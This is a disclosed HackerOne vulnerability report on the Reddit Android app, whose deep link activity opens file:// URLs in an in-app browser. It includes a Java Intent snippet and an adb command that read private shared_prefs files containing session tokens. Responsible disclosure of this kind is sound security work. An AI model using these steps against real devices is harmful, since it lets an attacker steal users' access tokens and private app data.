# Third party app could steal access token as well as protected files using inAppBrowser

## Report Details
- **Report ID**: 1122177
- **URL**: https://hackerone.com/reports/1122177
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-03-10T11:15:25.020Z
- **Disclosed**: 2021-10-27T14:10:40.811Z

## Reporter
- **Username**: rahulkankrale
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: reddit

## Vulnerability Information
## Summary:
Reddit android app version : 2021.8.0 
OS: Android 11

This app uses com.reddit.frontpage.RedditDeepLinkActivity class to route app links including deeplink and reddit.com links while this class does not check for scheme, host and it opens given url in InAppBrowser and IAB have access to apps private/protected files.

So any third party app could steal session token from "data/data/com.reddit.frontpage/shared_prefs/com.reddit.auth_active.UserName.xml" files as well as rest of sensitive files like DB, Cookies etc. 

## Impact:
Third party app could steal access token as well as protected files using inAppBrowser

## Steps To Reproduce:
To reproduce this issue I have created basic poc:
  1. Create third-party app using snippet (Replace UserName to victims username i.e. file:///data/data/com.reddit.frontpage/shared_prefs/com.reddit.auth_active.**Strong-Sun628**.xml) :

```java 
        Intent intent = new Intent();
        intent.setClassName("com.reddit.frontpage", "com.reddit.frontpage.RedditDeepLinkActivity");
        intent.setData(Uri.parse("file:///data/data/com.reddit.frontpage/shared_prefs/com.reddit.auth_active.UserName.xml"));
        startActivity(intent);
``` 
  1. Once open third-party app, Reddit app opens InAppBrowser with auth_active file and its data contained token.
  2. We could also reproduce this quickly using adb:

```shell
adb shell am start -n "com.reddit.frontpage/com.reddit.frontpage.RedditDeepLinkActivity" -d "file:///data/data/com.reddit.frontpage/shared_prefs/com.reddit.frontpage_preferences.xml"
```

## Supporting Material/References:
Video : Proof of concept
  * F1225199

if required I can submit complete POC to show how third-party app could save this files and send to attackers server.

Thanks
Rahul

## Impact

Third party app could steal access token as well as protected files using inAppBrowser

## Attachments
- reddit.mp4
